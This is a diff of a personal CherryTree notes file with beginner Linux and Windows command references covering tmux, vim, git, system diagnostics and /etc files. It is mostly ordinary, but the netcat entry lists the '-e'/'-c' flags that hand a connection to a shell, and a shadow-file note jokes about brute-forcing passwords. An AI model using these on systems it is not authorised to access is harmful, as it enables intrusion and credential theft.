@@ -2,9 +2,8 @@
 <cherrytree>
 	<node custom_icon_id="0" foreground="#3d3fc8" is_bold="True" name="Windows" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587419334.25" ts_lastsave="1590451609.9" unique_id="399">
 		<rich_text>mostly needed for sis' pc, z\faruk</rich_text>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="CMD Commands" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587419359.17" ts_lastsave="1589761332.05" unique_id="400">
-			<rich_text>
-</rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="CMD Commands" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587419359.17" ts_lastsave="1594727465.72" unique_id="400">
+			<rich_text></rich_text>
 			<node custom_icon_id="0" foreground="" is_bold="False" name="type" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587419373.04" ts_lastsave="1587680748.22" unique_id="401">
 				<rich_text>win version of cat</rich_text>
 			</node>
@@ -95,6 +94,21 @@ Arguments:
 /p      #stop after finding one?, smth like that
 </rich_text>
 			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="ver" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1594727433.18" ts_lastsave="1594727442.1" unique_id="612">
+				<rich_text>displays cmd version</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="ipconfig" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1594727479.54" ts_lastsave="1594727523.1" unique_id="614">
+				<rich_text>displays all network IP information</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="tasklist" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1594727523.1" ts_lastsave="1594727543.52" unique_id="615">
+				<rich_text>displays proceses and services</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="netstat -an" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1594727543.52" ts_lastsave="1594727546.8" unique_id="616">
+				<rich_text>displays current connections</rich_text>
+			</node>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Powershell Commands" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1594727454.16" ts_lastsave="1594727457.11" unique_id="613">
+			<rich_text></rich_text>
 		</node>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="File Structure" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1590451609.96" ts_lastsave="1591198809.36" unique_id="136">
 			<rich_text>
@@ -173,14 +187,14 @@ A few sample points that I find really useful:
 		<node custom_icon_id="0" foreground="" is_bold="False" name="Alternative Terminals" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569053819.33" ts_lastsave="1589934970.37" unique_id="44">
 			<rich_text>
 </rich_text>
-			<node custom_icon_id="0" foreground="" is_bold="False" name="tmux" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569059976.6" ts_lastsave="1589859125.51" unique_id="53">
+			<node custom_icon_id="0" foreground="" is_bold="False" name="tmux" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569059976.6" ts_lastsave="1595264926.6" unique_id="53">
 				<rich_text>The biggest benefit to tmux is:
 “It runs your window in a process and not tied to your session.”
 
 I suppose every window you close still runs in the background? Yes.
 
 !prefix + ? for keybindings!</rich_text>
-				<node custom_icon_id="0" foreground="" is_bold="False" name="Commands" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570713506.31" ts_lastsave="1570809066.26" unique_id="57">
+				<node custom_icon_id="0" foreground="" is_bold="False" name="Commands" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570713506.31" ts_lastsave="1595259556.64" unique_id="57">
 					<rich_text>
 </rich_text>
 					<node custom_icon_id="0" foreground="" is_bold="False" name="attach -t [name]" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570714643.99" ts_lastsave="1589858800.3" unique_id="60">
@@ -210,6 +224,9 @@ SUPER HELPFUL NOTE: The target machine still uses its own .tmux.conf. With that 
 					</node>
 					<node custom_icon_id="0" foreground="" is_bold="False" name="new -s [name]" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570713512.7" ts_lastsave="1570713904.96" unique_id="58">
 						<rich_text>Creates a new session.</rich_text>
+					</node>
+					<node custom_icon_id="0" foreground="" is_bold="False" name="tmux kill-server" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1595259556.64" ts_lastsave="1595259580.21" unique_id="624">
+						<rich_text>kill tmux server and destroy all sessions</rich_text>
 					</node>
 				</node>
 				<node custom_icon_id="0" foreground="" is_bold="False" name="Shortcuts" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570712341.43" ts_lastsave="1570807533.94" unique_id="2">
@@ -385,7 +402,7 @@ eg output:
 rm -R dir2       //deletes recursively</rich_text>
 				</node>
 			</node>
-			<node custom_icon_id="0" foreground="" is_bold="False" name="Diagnostics (sysinfo)" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586351679.15" ts_lastsave="1591199275.52" unique_id="128">
+			<node custom_icon_id="0" foreground="" is_bold="False" name="Diagnostics (sysinfo)" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586351679.15" ts_lastsave="1595250595.64" unique_id="128">
 				<rich_text>
 </rich_text>
 				<node custom_icon_id="0" foreground="" is_bold="False" name="lscpu" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586351689.34" ts_lastsave="1586351689.34" unique_id="135">
@@ -412,11 +429,27 @@ rm -R dir2       //deletes recursively</rich_text>
 				<node custom_icon_id="0" foreground="" is_bold="False" name="lsubs" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569047073.76" ts_lastsave="1591199856.51" unique_id="37">
 					<rich_text>outputs info on connected usb devices</rich_text>
 				</node>
-				<node custom_icon_id="0" foreground="" is_bold="False" name="uname -a" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569045956.85" ts_lastsave="1591200403.4" unique_id="29">
-					<rich_text>gives kernel version etc.</rich_text>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="uname -a" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569045956.85" ts_lastsave="1595250469.43" unique_id="29">
+					<rich_text>gives kernel version etc.
+
+</rich_text>
+				</node>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="give OS info" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1595250469.43" ts_lastsave="1595251174.8" unique_id="622">
+					<rich_text>cat /etc/os-release
+lsb_release -a
+hostnamectl</rich_text>
 				</node>
 				<node custom_icon_id="0" foreground="" is_bold="False" name="df -h" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591015612.11" ts_lastsave="1591200676.12" unique_id="584">
 					<rich_text>mounted drive &amp; partition info</rich_text>
+				</node>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="finding the shell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1595250595.64" ts_lastsave="1595251152.05" unique_id="623">
+					<rich_text>1. ps -p $$ – Display your current shell name reliably.
+2. echo &quot;$SHELL&quot; – Display the shell for the current user but not necessarily the shell that is running at the movement.
+3. echo $0 – Another reliable and simple method to get the current shell interpreter name on Linux or Unix-like systems.
+4. cat /etc/shells – List pathnames of valid login shells currently installed
+5. grep &quot;^$USER&quot; /etc/passwd – Print the default shell name. The default shell runs when you open a terminal window.
+6. chsh -s /bin/ksh – Change the shell used from /bin/bash (default) to /bin/ksh for your account
+</rich_text>
 				</node>
 			</node>
 			<node custom_icon_id="0" foreground="" is_bold="False" name="gnome" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1585920716.08" ts_lastsave="1589858721.04" unique_id="161">
@@ -715,7 +748,7 @@ ls even shows that its a symbolic link with the arrow pointing to what the link 
 lol
 </rich_text>
 			</node>
-			<node custom_icon_id="0" foreground="" is_bold="False" name="nc" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570892880.59" ts_lastsave="1589936553.8" unique_id="126">
+			<node custom_icon_id="0" foreground="" is_bold="False" name="nc" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570892880.59" ts_lastsave="1594726762.16" unique_id="126">
 				<rich_text>netcat
 useful for connecting to servers with open ports to interact with.
 nc is sweet, you can even serve entire files through nc and listen &amp; write them on a separate machine
@@ -729,7 +762,7 @@ nc $ip 9001
 Arguments:
 -u              # udp
 -c command      # given to /bin/sh
--e file         # execute file
+-e file         # execute file (some versions don't support E)
 -q 0            # wait X seconds after EOF on stdin. Yooo this is so useful! Yoinking a file is easier with this.</rich_text>
 			</node>
 			<node custom_icon_id="0" foreground="" is_bold="False" name="ping" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569045923.14" ts_lastsave="1569045923.14" unique_id="27">
@@ -850,8 +883,8 @@ touch *.txt     //all text files are now modified with nothing.
 SMALL NOTE: wget doesn't modify the modified date of the file downloaded, while the browsers do.
 BIG NOTE: make sure ur downloading RAW, otherwise ur gonna download HTML xD</rich_text>
 			</node>
-			<node custom_icon_id="0" foreground="" is_bold="False" name="which &lt;package&gt;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569044889.69" ts_lastsave="1586377900.19" unique_id="21">
-				<rich_text>outputs the path of the installed package</rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="which &lt;command&gt;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569044889.69" ts_lastsave="1594892682.55" unique_id="21">
+				<rich_text>outputs the &quot;path-to-bin&quot; of the command if its in $PATH</rich_text>
 			</node>
 			<node custom_icon_id="0" foreground="" is_bold="False" name="whoami" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586885116.7" ts_lastsave="1587233784.31" unique_id="305">
 				<rich_text>print the logged in user of the shell</rich_text>
@@ -917,10 +950,26 @@ like ifconfig</rich_text>
 sleep 1     # 1 sec
 sleep 0.1   # 0.1 sec</rich_text>
 			</node>
-			<node custom_icon_id="0" foreground="" is_bold="False" name="git" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589938594.7" ts_lastsave="1589938599.41" unique_id="569">
+			<node custom_icon_id="0" foreground="" is_bold="False" name="git" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589938594.7" ts_lastsave="1594997648.62" unique_id="569">
 				<rich_text>I NEED TO GET git in here!
 its so painful with millions of .txt .pdf .jpg files as notes!
-TODO</rich_text>
+TODO
+
+
+git add
+git branch
+git commit
+git checkout
+git diff
+git push
+git pull
+git status
+git rebase
+git fetch
+git log
+
+
+NOTE: all these commands have their own help files =)</rich_text>
 			</node>
 			<node custom_icon_id="0" foreground="" is_bold="False" name="groups" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1590102849.07" ts_lastsave="1591201147.62" unique_id="576">
 				<rich_text>list groups</rich_text>
@@ -1048,21 +1097,28 @@ NOTE: doesnt show stdout on console</rich_text>
 				<rich_text>delete everything to the right of the cursor</rich_text>
 			</node>
 		</node>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="Tips" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569051936.36" ts_lastsave="1591017089.07" unique_id="42">
-			<rich_text>(for bash)</rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Tips" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569051936.36" ts_lastsave="1594892844.34" unique_id="42">
+			<rich_text>(for bash)
+
+TODO
+try to merge these into upper folders
+most &quot;tips&quot; here are just commands</rich_text>
 			<node custom_icon_id="0" foreground="" is_bold="False" name="#" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570892706.82" ts_lastsave="1570892707.72" unique_id="124">
 				<rich_text>comments out the line</rich_text>
 			</node>
 			<node custom_icon_id="0" foreground="" is_bold="False" name="$ on terminal" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587057562.93" ts_lastsave="1587057563.89" unique_id="358">
 				<rich_text>since it is an operator, if $ is used within a hash, keep it in quotes to avoid nonsensical stuff</rich_text>
 			</node>
-			<node custom_icon_id="0" foreground="" is_bold="False" name="$TERM" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586633939.37" ts_lastsave="1586633941.7" unique_id="296">
+			<node custom_icon_id="0" foreground="" is_bold="False" name="$TERM" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586633939.37" ts_lastsave="1594892463.84" unique_id="296">
 				<rich_text>i think this is the terminal engine
 it can be changed to something else
 
 example:
 tmux-256color
 xterm-256color</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="$SHELL" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1594892463.85" ts_lastsave="1594892620.47" unique_id="619">
+				<rich_text></rich_text>
 			</node>
 			<node custom_icon_id="0" foreground="" is_bold="False" name="hex to ascii" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1579353470.3" ts_lastsave="1579353489.78" unique_id="156">
 				<rich_text>echo “HEX” | xxd -r
@@ -1166,6 +1222,25 @@ echo $_
 			<node custom_icon_id="0" foreground="" is_bold="False" name="echo $?" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591017089.46" ts_lastsave="1591017095.19" unique_id="588">
 				<rich_text>display the exit code of the last command</rich_text>
 			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="type" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1594892844.34" ts_lastsave="1594892908.36" unique_id="620">
+				<rich_text>Displays information about command type.
+For each NAME, indicate how it would be interpreted if used as a command name.
+
+Options:
+      -a        display all locations containing an executable named NAME;
+                includes aliases, builtins, and functions, if and only if
+                the `-p' option is not also used
+      -f        suppress shell function lookup
+      -P        force a PATH search for each NAME, even if it is an alias,
+                builtin, or function, and returns the name of the disk file
+                that would be executed
+      -p        returns either the name of the disk file that would be executed,
+                or nothing if `type -t NAME' would not return `file'
+      -t        output a single word which is one of `alias', `keyword',
+                `function', `builtin', `file' or `', if NAME is an alias,
+                shell reserved word, shell function, shell builtin, disk file,
+                or not found, respectively</rich_text>
+			</node>
 		</node>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="note about root" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586435978.31" ts_lastsave="1589606231.34" unique_id="279">
 			<rich_text>if you create a folder as the root user (not with sudo)
@@ -1173,7 +1248,7 @@ the folder will be owned by root and no other user will be able to write to it
 just FYI</rich_text>
 		</node>
 	</node>
-	<node custom_icon_id="0" foreground="#000dff" is_bold="True" name="Linux Software" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569046358.88" ts_lastsave="1589934050.88" unique_id="32">
+	<node custom_icon_id="0" foreground="#000dff" is_bold="True" name="Linux Software" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569046358.88" ts_lastsave="1594669594.91" unique_id="32">
 		<rich_text>For desktop software check faruk -&gt; PROGRAM -&gt; PROGRAM(LINUX)
 or github.com/Thmyris/linux.cfg</rich_text>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="Gaming" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586183759.74" ts_lastsave="1589427405.44" unique_id="193">
@@ -1190,12 +1265,15 @@ or github.com/Thmyris/linux.cfg</rich_text>
 				<rich_text>similiar to lutris?</rich_text>
 			</node>
 		</node>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="Media Players" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586437430.86" ts_lastsave="1586437436.7" unique_id="281">
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Media Players" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586437430.86" ts_lastsave="1594669479.11" unique_id="281">
 			<rich_text>
 </rich_text>
 			<node custom_icon_id="0" foreground="" is_bold="False" name="Parole" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586437436.78" ts_lastsave="1586437436.78" unique_id="282">
 				<rich_text>
 </rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="vlc" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1594669479.11" ts_lastsave="1594669481.19" unique_id="608">
+				<rich_text></rich_text>
 			</node>
 		</node>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="RDP" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586183105.58" ts_lastsave="1589606224.26" unique_id="208">
@@ -1212,10 +1290,10 @@ recommended by ctt</rich_text>
 			<node custom_icon_id="0" foreground="" is_bold="False" name="Flameshot" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586184247.28" ts_lastsave="1586184317.11" unique_id="205">
 				<rich_text>christitus tech recommends</rich_text>
 			</node>
-			<node custom_icon_id="0" foreground="" is_bold="False" name="xfce base screenshot tool" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586184275.24" ts_lastsave="1586184302.28" unique_id="207">
+			<node custom_icon_id="0" foreground="" is_bold="False" name="xfce base screenshot tool" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586184275.24" ts_lastsave="1594669575.24" unique_id="207">
 				<rich_text>pretty nice.
 very much like lightshot but with added 1 extra click everytime.
-</rich_text>
+doesnt freezeframe</rich_text>
 			</node>
 		</node>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="Task Managers" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586713227.24" ts_lastsave="1589168220.89" unique_id="319">
@@ -1250,88 +1328,43 @@ go run github.com/cjbassi/gotop</rich_text>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="Text Editors" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586176395.27" ts_lastsave="1586876410.15" unique_id="147">
 			<rich_text>
 </rich_text>
-			<node custom_icon_id="0" foreground="" is_bold="False" name="vim" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570715235.33" ts_lastsave="1593944531.77" unique_id="65">
+			<node custom_icon_id="0" foreground="" is_bold="False" name="vim" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570715235.33" ts_lastsave="1594888089.48" unique_id="65">
 				<rich_text>if you have any brain
 you'd use nano instead</rich_text>
-				<node custom_icon_id="0" foreground="" is_bold="False" name="-normal mode-" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570715341.37" ts_lastsave="1591019039.18" unique_id="71">
+				<node custom_icon_id="0" foreground="" is_bold="False" name="-normal mode-" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570715341.37" ts_lastsave="1594888932.55" unique_id="71">
 					<rich_text>default mode.
 to go back to insert mode
-press i or a</rich_text>
-					<node custom_icon_id="0" foreground="" is_bold="False" name="v" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591010931.93" ts_lastsave="1591016372.42" unique_id="387">
-						<rich_text>select characters</rich_text>
-						<node custom_icon_id="0" foreground="" is_bold="False" name="V" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591010940.49" ts_lastsave="1591011015.07" unique_id="579">
-							<rich_text>select lines
-</rich_text>
-						</node>
-						<node custom_icon_id="0" foreground="" is_bold="False" name="ctrl+v" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591010946.9" ts_lastsave="1591011017.74" unique_id="580">
-							<rich_text>block select</rich_text>
-						</node>
-						<node custom_icon_id="0" foreground="" is_bold="False" name="y" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591011021.59" ts_lastsave="1591011022.11" unique_id="581">
-							<rich_text>copy selection</rich_text>
-						</node>
-						<node custom_icon_id="0" foreground="" is_bold="False" name="d" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591011029.62" ts_lastsave="1591011038.02" unique_id="582">
-							<rich_text>cut selection</rich_text>
-						</node>
-						<node custom_icon_id="0" foreground="" is_bold="False" name="p" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591011038.4" ts_lastsave="1591011038.89" unique_id="583">
-							<rich_text>paste selection</rich_text>
-						</node>
-					</node>
-					<node custom_icon_id="0" foreground="" is_bold="False" name="/ [string]" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570715787.58" ts_lastsave="1591010383.29" unique_id="79">
-						<rich_text>searches down from where the cursor is
-n back search
-N forward search</rich_text>
-					</node>
-					<node custom_icon_id="0" foreground="" is_bold="False" name="? [string]" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570715750.0" ts_lastsave="1591010393.12" unique_id="78">
-						<rich_text>searches up from where the cursor is
-n back search
-N forward search</rich_text>
-					</node>
-					<node custom_icon_id="0" foreground="" is_bold="False" name="Ctrl + C  V  q" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570717341.8" ts_lastsave="1591010743.62" unique_id="82">
-						<rich_text>exits the mode?</rich_text>
-					</node>
-					<node custom_icon_id="0" foreground="" is_bold="False" name="space" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570717236.27" ts_lastsave="1570893678.18" unique_id="81">
-						<rich_text>starts selecting
-pressing enter copies the thing you selected
-TO buffer_0
-you can paste that buffer with prefix -&gt; ] in tmux</rich_text>
-					</node>
-					<node custom_icon_id="0" foreground="" is_bold="False" name=":23G" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591010122.6" ts_lastsave="1591010567.45" unique_id="66">
-						<rich_text>goes to 23th line</rich_text>
-					</node>
-					<node custom_icon_id="0" foreground="" is_bold="False" name=":wq" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570715251.1" ts_lastsave="1591010571.4" unique_id="68">
-						<rich_text>write and quit</rich_text>
-					</node>
-					<node custom_icon_id="0" foreground="" is_bold="False" name=":!" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570715295.16" ts_lastsave="1591010574.32" unique_id="69">
-						<rich_text>forces action</rich_text>
-					</node>
-					<node custom_icon_id="0" foreground="" is_bold="False" name=":q" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570715246.61" ts_lastsave="1591010576.63" unique_id="67">
-						<rich_text>quit without writing</rich_text>
-					</node>
-					<node custom_icon_id="0" foreground="" is_bold="False" name="u" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591010655.03" ts_lastsave="1591010655.91" unique_id="70">
-						<rich_text>undo</rich_text>
-					</node>
-					<node custom_icon_id="0" foreground="" is_bold="False" name="ctrl+r" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591010663.11" ts_lastsave="1591010663.86" unique_id="72">
-						<rich_text>redo</rich_text>
-					</node>
-					<node custom_icon_id="0" foreground="" is_bold="False" name="yy" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591010668.76" ts_lastsave="1591010669.77" unique_id="386">
-						<rich_text>copy line</rich_text>
-					</node>
-					<node custom_icon_id="0" foreground="" is_bold="False" name=":set number" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591010136.26" ts_lastsave="1591016385.82" unique_id="578">
-						<rich_text>shows line numbers
-</rich_text>
-					</node>
-					<node custom_icon_id="0" foreground="" is_bold="False" name=":syntax on" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591016363.59" ts_lastsave="1591016365.9" unique_id="586">
-						<rich_text>enables syntax highlighting</rich_text>
-					</node>
-					<node custom_icon_id="0" foreground="" is_bold="False" name="dd" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591018499.03" ts_lastsave="1591018499.64" unique_id="589">
-						<rich_text>delete line</rich_text>
-					</node>
-					<node custom_icon_id="0" foreground="" is_bold="False" name="-O file1 file2" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591019039.57" ts_lastsave="1591019149.41" unique_id="590">
-						<rich_text>opens both files split in vertical manner
+press i or a
 
-To switch between panes:
-ctrl+w &amp; arrowkeys || hjkl</rich_text>
-					</node>
+</rich_text>
+					<rich_text weight="heavy">Visual Modes(if you cut in vim it stays in vim -_-):</rich_text>
+					<rich_text>
+v                  # select characters
+V                  # select lines
+ctrl+v             # block select
+y                  # copy selection
+d                  # cut selection
+p                  # paste selection
+
+</rich_text>
+					<rich_text weight="heavy">Arguments:</rich_text>
+					<rich_text>
+/[string]          # searches down from where the cursor is: (n back search | N forward search)
+?[string]          # searches up from where the cursor is:   (n back search | N forward search)
+space              # starts selecting, 'enter' copies the thing you selected TO buffer_0. You can paste that buffer with prefix -&gt; ] in tmux
+:23G               # goes to 23th line
+:wq                # write and quit
+:!                 # forces action
+:q                 # quit without writing
+u                  # undo
+ctrl+r             # redo
+dd                 # delete line
+yy                 # copy line
+:set number        # shows line numbers
+:syntax on         # enables syntax highlighting
+-O file1 file2     # opens 2 files split in vertical manner. To switch between panes: (ctrl+w) + (&lt;-, ^, v, -&gt;) || (hjkl)
+
+</rich_text>
 				</node>
 				<node custom_icon_id="0" foreground="" is_bold="False" name="-INSERT-" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570715372.35" ts_lastsave="1591010590.41" unique_id="73">
 					<rich_text>
@@ -1416,8 +1449,14 @@ xte &quot;keydown Control_R&quot;
 xte &quot;keyup Control_L&quot;</rich_text>
 			</node>
 		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Emulators" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1594669594.91" ts_lastsave="1594669595.03" unique_id="609">
+			<rich_text>s</rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="genymotion" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1594669600.53" ts_lastsave="1594669601.22" unique_id="610">
+				<rich_text>android emulator, eybisi kullaniyordu.</rich_text>
+			</node>
+		</node>
 	</node>
-	<node custom_icon_id="0" foreground="#1aff00" is_bold="True" name="Linux Core" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569055585.56" ts_lastsave="1589946553.26" unique_id="46">
+	<node custom_icon_id="0" foreground="#1aff00" is_bold="True" name="Linux Core" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569055585.56" ts_lastsave="1595237359.65" unique_id="46">
 		<rich_text>
 </rich_text>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="Environment variables " prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586877154.23" ts_lastsave="1586877187.18" unique_id="337">
@@ -1460,11 +1499,13 @@ You cannot have 2 groups owning the same file.
 You do not have nested groups in Linux. One group cannot be sub-group of other
 x- eXecuting a directory means Being allowed to &quot;enter&quot; a dir and gain possible access to sub-dirs</rich_text>
 					</node>
-					<node custom_icon_id="0" foreground="" is_bold="False" name="passwd" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1579248601.46" ts_lastsave="1586881604.29" unique_id="145">
+					<node custom_icon_id="0" foreground="" is_bold="False" name="passwd" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1579248601.46" ts_lastsave="1594892136.04" unique_id="145">
 						<rich_text>world readable.
 contains all the login information on all the possible “users(groups?)”
 passwords -&gt; x means password is shadowed to /etc/shadow
+
 </rich_text>
+						<rich_text link="webs https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/">https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/</rich_text>
 					</node>
 					<node custom_icon_id="0" foreground="" is_bold="False" name="shadow" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1579248751.56" ts_lastsave="1586881606.87" unique_id="146">
 						<rich_text>only root and the shadow group can read this file.
@@ -1476,9 +1517,9 @@ but that means you can bruteforce it :)</rich_text>
 						<rich_text>
 </rich_text>
 					</node>
-					<node custom_icon_id="0" foreground="" is_bold="False" name="skel" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589410342.98" ts_lastsave="1589410364.47" unique_id="478">
+					<node custom_icon_id="0" foreground="" is_bold="False" name="skel" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589410342.98" ts_lastsave="1594892319.22" unique_id="478">
 						<rich_text>The /etc/skel directory contains  files and directories that are automatically copied over to a new user's  when it is created from useradd command.
-backup of dotfiles</rich_text>
+basically a backup of dotfiles</rich_text>
 					</node>
 					<node custom_icon_id="0" foreground="" is_bold="False" name="hosts" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589875720.24" ts_lastsave="1589875720.24" unique_id="558">
 						<rich_text>
@@ -1687,7 +1728,7 @@ for suid see. Pentesting
 			<rich_text>
 </rich_text>
 		</node>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="$PATH" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588957201.95" ts_lastsave="1589428137.17" unique_id="471">
+		<node custom_icon_id="0" foreground="" is_bold="False" name="$PATH" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588957201.95" ts_lastsave="1594655059.13" unique_id="471">
 			<rich_text>PATH=$PATH:/my/new/path
 add a path for the current session
 
@@ -1720,9 +1761,11 @@ Extra info:
 # 
 #     Things like paths should go into .profile if you want them to work outside of the interactive sessions. (say when you press Alt+F2 in GNOME)
 
-#snap path addition
-
 </rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="autostart" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1595237359.65" ts_lastsave="1595237394.64" unique_id="621">
+			<rich_text>In xfce it can be configured at:
+Settings Manager -&gt; Session and Startup -&gt; Application Autostart</rich_text>
 		</node>
 	</node>
 	<node custom_icon_id="0" foreground="#ffa500" is_bold="True" name="General Knowledge" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570862761.15" ts_lastsave="1591016499.82" unique_id="116">
@@ -1847,7 +1890,7 @@ Compiling:
 gcc matrix.c -o matrix
 gcc matrix.c -o matrix -Wall        //enable all warnings</rich_text>
 		</node>
-		<node custom_icon_id="0" foreground="#be00ff" is_bold="True" name="Python" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570862495.29" ts_lastsave="1592310180.77" unique_id="108">
+		<node custom_icon_id="0" foreground="#be00ff" is_bold="True" name="Python" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570862495.29" ts_lastsave="1594727130.1" unique_id="108">
 			<rich_text>help(funcName) is basically a man page for functions</rich_text>
 			<node custom_icon_id="0" foreground="" is_bold="False" name="Arguments" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570863644.23" ts_lastsave="1579247991.73" unique_id="120">
 				<rich_text>
